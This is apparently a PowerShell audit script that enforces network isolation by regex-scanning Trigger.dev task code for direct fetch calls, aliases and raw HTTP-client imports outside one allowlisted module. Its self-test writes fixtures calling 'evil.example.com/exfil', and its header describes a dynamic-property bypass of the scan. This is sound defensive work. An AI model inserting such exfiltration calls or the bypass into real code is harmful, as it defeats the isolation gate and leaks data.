[CmdletBinding()]
param(
  [Parameter(Mandatory)]
  [string]$Dir,
  [string]$AllowlistRelativePath = 'runner-client.mjs',
  [switch]$SkipSelfTest
)

# HCI_COLLECTOR_DISCOVERED_PIPELINE_PLAN.md Task 9 (ADR-0029 gate 6, test id
# wave6-trigger-no-direct-fetch): Trigger.dev task code may ONLY call the
# isolated fetch-runner's own internal API -- it must never issue an outbound
# HTTP request to a non-whitelisted target itself (gate 6's whole point:
# Trigger.dev orchestrates, the network-isolated runner is the only thing
# that ever actually dials out). A dataflow check that verifies every fetch
# call's TARGET is the runner's own base URL is out of reach for a text
# scan -- this instead forbids the SHAPE of a direct HTTP client reference
# (global fetch identifier -- called OR merely aliased/re-exported --,
# http/https/undici/axios import, XMLHttpRequest) anywhere in $Dir's task
# source, except inside the ONE file at $AllowlistRelativePath (the
# designated "runner client" module that legitimately makes that call, same
# shape as lobster-factory's own collect-scheduled-crawl.ts delegating to a
# separate postRunDueSchedules() rather than fetching inline).
#
# KNOWN GAP, found by critic review 2026-09-18 via real PoC (not
# theoretical), same disclosure convention this repo's other audit scripts
# already use (check-no-universal-trust-column.ps1's own header, e.g.):
# this remains a text/regex scan, not an AST with scope resolution. It WILL
# catch a bare `fetch(...)` call and now also a bare reference to the
# identifier (`const x = fetch`, `export const y = fetch` -- closed by this
# revision, see below), because both require the literal token "fetch" to
# appear in the source. It CANNOT catch a DYNAMICALLY CONSTRUCTED property
# access that never spells "fetch" as one token -- e.g.
# `globalThis['fe' + 'tch'](...)` or `globalThis['fetch'.split('').reverse()...]`.
# Closing that class requires real interpretation (a JS engine or an
# AST+dataflow tool), not a text scan; tracked as a follow-up in
# agency-os/TASKS.md, not fixed here. Given this file is ADR-0029 gate 6's
# ONLY enforcement mechanism (the Trigger.dev worker process itself has no
# iptables-level isolation the way the fetch-runner container does), do not
# read a passing run of this script as "gate 6 is fully closed" -- it means
# "no naive or aliased direct-fetch shape was found," which is the
# realistic bar for a script at this layer, not a formal proof.
#
# Comments are stripped first (both // line and /* block */ forms) so a
# comment merely mentioning "fetch" or "import http" cannot trigger a false
# positive; a string literal containing those words is accepted as a known,
# narrow blind spot (same class of trade-off check-no-universal-trust-column.ps1
# and verify-epistemic-annotation.ps1 already document for their own domains).
#
# Allowlist is an EXACT path relative to $Dir, not a filename substring/
# wildcard match (critic review 2026-09-18, real PoC: the original
# `-like '*runner-client*'` let a decoy file named e.g.
# `runner-client-shim.mjs` skip every rule in this script merely by
# containing that substring in its name, regardless of what it actually
# did). This script also asserts exactly ONE file exists at that exact path
# -- zero means the real allowlisted module went missing (nothing left to
# legitimately make the runner call at all); more than one is impossible via
# a single exact relative path today, kept as a self-test alongside the
# other assertions below.
#
# Self-test runs first by default, same non-vacuity rule every audit script
# in this repo follows.

$ErrorActionPreference = 'Stop'

# Matched against comment-stripped source. A single unified pattern for BOTH
# a direct call (`fetch(...)`) and a bare reference/alias/re-export
# (`const x = fetch`, `export const y = fetch`, `cb(fetch)`) -- critic review
# 2026-09-18, real PoC: the original pattern required an immediately
# following `(`, so `const doFetch = fetch; doFetch(...)` (alias, called
# under a different local name) and `export const unsafeFetch = fetch;`
# (re-export) both slipped through undetected. `\bfetch\b` alone (no
# trailing `\(` requirement) closes both, at the cost of also flagging any
# OTHER bare reference to the identifier (e.g. `typeof fetch`) -- accepted
# deliberately: this is a security gate, and over-blocking a rare legitimate
# pattern (which a human then explicitly moves into the allowlisted file or
# reviews) is the correct direction versus under-blocking a real bypass.
# The leading negative lookbehind still excludes `.fetch` (a property/method
# call on some other, unrelated object -- e.g. `runnerClient.fetch(...)` on
# a narrow allowlisted wrapper) and `xFetch`/`fetchY`-shaped longer
# identifiers (word boundary already handles the latter; the lookbehind is
# for the dot case specifically).
$directFetchPattern = "(?<![.\w])fetch\b"
$forbiddenImportPattern = "(?:from\s+['`"](?:node:)?(?:http|https|undici|axios|node-fetch)['`"]|require\s*\(\s*['`"](?:node:)?(?:http|https|undici|axios|node-fetch)['`"]\s*\)|import\s*\(\s*['`"](?:node:)?(?:http|https|undici|axios|node-fetch)['`"]\s*\))"
$xhrPattern = '\bnew\s+XMLHttpRequest\b'

function Remove-Comments {
  param([Parameter(Mandatory)][string]$Source)
  # Block comments first (non-greedy), then line comments -- ordering avoids
  # a `//` inside a /* ... */ block truncating the wrong span.
  $noBlock = [regex]::Replace($Source, '/\*.*?\*/', '', [System.Text.RegularExpressions.RegexOptions]::Singleline)
  return [regex]::Replace($noBlock, '//[^\r\n]*', '')
}

function Get-TriggerDirectFetchViolations {
  param([Parameter(Mandatory)][string]$Dir, [Parameter(Mandatory)][string]$AllowlistRelativePath)
  $files = Get-ChildItem -LiteralPath $Dir -Recurse -Include '*.ts', '*.mts', '*.mjs', '*.js' -File -ErrorAction SilentlyContinue
  if ($files.Count -eq 0) { throw "no .ts/.mts/.mjs/.js files found in $Dir" }
  $dirFull = (Resolve-Path -LiteralPath $Dir).Path.TrimEnd('\', '/')
  $violations = @()
  $allowlistMatchCount = 0
  foreach ($f in $files) {
    $relPath = ($f.FullName.Substring($dirFull.Length).TrimStart('\', '/')) -replace '\\', '/'
    if ($relPath -eq $AllowlistRelativePath) { $allowlistMatchCount++; continue }
    $stripped = Remove-Comments -Source (Get-Content -Raw -Encoding UTF8 -LiteralPath $f.FullName)
    if ([regex]::IsMatch($stripped, $directFetchPattern)) {
      $violations += "$($f.FullName): references the global fetch identifier (call or alias/re-export) outside the allowlisted runner-client module"
    }
    if ([regex]::IsMatch($stripped, $forbiddenImportPattern)) {
      $violations += "$($f.FullName): imports a raw HTTP client (http/https/undici/axios/node-fetch) outside the allowlisted runner-client module"
    }
    if ([regex]::IsMatch($stripped, $xhrPattern)) {
      $violations += "$($f.FullName): uses XMLHttpRequest outside the allowlisted runner-client module"
    }
  }
  if ($allowlistMatchCount -ne 1) {
    $violations += "expected exactly 1 file at '$AllowlistRelativePath' (relative to $Dir) -- found $allowlistMatchCount. Zero means the allowlisted runner-client module is missing; more than one means an ambiguous/duplicate allowlist target."
  }
  return ,$violations
}

if (-not $SkipSelfTest) {
  $tmp = Join-Path ([IO.Path]::GetTempPath()) ('trigger-no-fetch-selftest-' + [Guid]::NewGuid().ToString('N'))
  New-Item -ItemType Directory -Path $tmp | Out-Null
  try {
    # Bad: a task file that "刻意塞一行直接 fetch" (the plan's own acceptance
    # wording) -- a deliberately inserted direct fetch call, exactly the
    # mutation this check exists to catch.
    [IO.File]::WriteAllText((Join-Path $tmp 'enqueue.task.ts'),
      "export async function run() {`n  const res = await fetch('https://evil.example.com/exfil');`n  return res;`n}`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Bad: importing a raw HTTP client instead of calling fetch directly.
    [IO.File]::WriteAllText((Join-Path $tmp 'status.task.ts'),
      "import { request } from 'undici';`nexport async function run() { return request('https://example.com/'); }`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Bad (critic review 2026-09-18, real PoC this exact fixture reproduces):
    # aliasing the global identifier to a local name, then calling THAT --
    # the original pattern (required an immediately-following `(`) missed
    # this because `fetch` itself is never immediately followed by `(` here.
    [IO.File]::WriteAllText((Join-Path $tmp 'aliased.task.ts'),
      "const doFetch = fetch;`nexport async function run() { return doFetch('https://evil.example.com/exfil'); }`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Bad (critic review 2026-09-18, real PoC): a decoy file whose NAME
    # merely contains the substring "runner-client" but is not the exact
    # allowlisted path -- the original `-like '*runner-client*'` let this
    # skip every rule purely by filename. Now scanned like any other file.
    [IO.File]::WriteAllText((Join-Path $tmp 'runner-client-shim.mjs'),
      "export const unsafeFetch = fetch;`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Good: a comment merely mentioning fetch/http must not false-positive.
    [IO.File]::WriteAllText((Join-Path $tmp 'clean.task.ts'),
      "// this task used to fetch() directly via node:http, now delegates to runnerClient\nimport { callRunner } from './runner-client';`nexport async function run() { return callRunner('/enqueue'); }`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Good: the one allowlisted module (exact relative path) -- a real fetch
    # call/reference here must clear.
    [IO.File]::WriteAllText((Join-Path $tmp 'runner-client.mjs'),
      "export async function callRunner(path) {`n  return fetch('http://runner.internal:8090' + path);`n}`n",
      (New-Object System.Text.UTF8Encoding($false)))

    $found = Get-TriggerDirectFetchViolations -Dir $tmp -AllowlistRelativePath 'runner-client.mjs'
    # Real repro, running this for real: a bare `-split ':'` breaks on
    # Windows, where the violation string's own path starts "C:\..." -- the
    # drive-letter colon splits before the real "<path>: <message>"
    # separator ever does, leaving just "C" as the extracted "filename".
    # Splitting on ": " (colon-SPACE, the actual separator this script's own
    # violation strings use, `"$($f.FullName): ..."` above) instead of a
    # bare colon fixes it -- paths themselves never contain ": ".
    $foundFiles = @($found | Where-Object { $_ -match ': ' } | ForEach-Object { ($_ -split ': ', 2)[0] } | Sort-Object -Unique | ForEach-Object { Split-Path -Leaf $_ })
    $expectedFiles = @('enqueue.task.ts', 'status.task.ts', 'aliased.task.ts', 'runner-client-shim.mjs') | Sort-Object
    if (@(Compare-Object $foundFiles $expectedFiles).Count -ne 0) {
      Write-Host 'check-trigger-no-direct-fetch: SELF-TEST FAILED -- expected exactly enqueue.task.ts (bare fetch call), status.task.ts (undici import), aliased.task.ts (fetch aliased to a local name then called), and runner-client-shim.mjs (decoy filename, not the exact allowlisted path) to be flagged; clean.task.ts (delegates to a local helper, comment merely mentions fetch/http) and runner-client.mjs (the real allowlisted module) must NOT be flagged. Got:'
      $found | ForEach-Object { Write-Host "  $_" }
      exit 2
    }
  } finally {
    Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
  }
  Write-Host 'check-trigger-no-direct-fetch: self-test ok (bare fetch() calls, aliased/re-exported fetch references, raw HTTP-client imports, and a filename-substring-only decoy are all flagged outside the allowlisted runner-client.mjs; a comment mentioning fetch/http, a call to a local helper, and the real allowlisted module itself are not)'
}

if (-not (Test-Path -LiteralPath $Dir)) { throw "directory not found: $Dir" }
$real = Get-TriggerDirectFetchViolations -Dir $Dir -AllowlistRelativePath $AllowlistRelativePath
if ($real.Count -gt 0) {
  Write-Host ('check-trigger-no-direct-fetch: FAIL -- {0} violation(s) (ADR-0029 gate 6, wave6-trigger-no-direct-fetch):' -f $real.Count)
  $real | ForEach-Object { Write-Host "  $_" }
  exit 1
}
Write-Host 'check-trigger-no-direct-fetch: ok -- no direct/aliased HTTP client usage outside the allowlisted runner-client module (regex-based scan -- see this file''s own header for the dynamic-property-access blind spot this cannot catch)'
exit 0
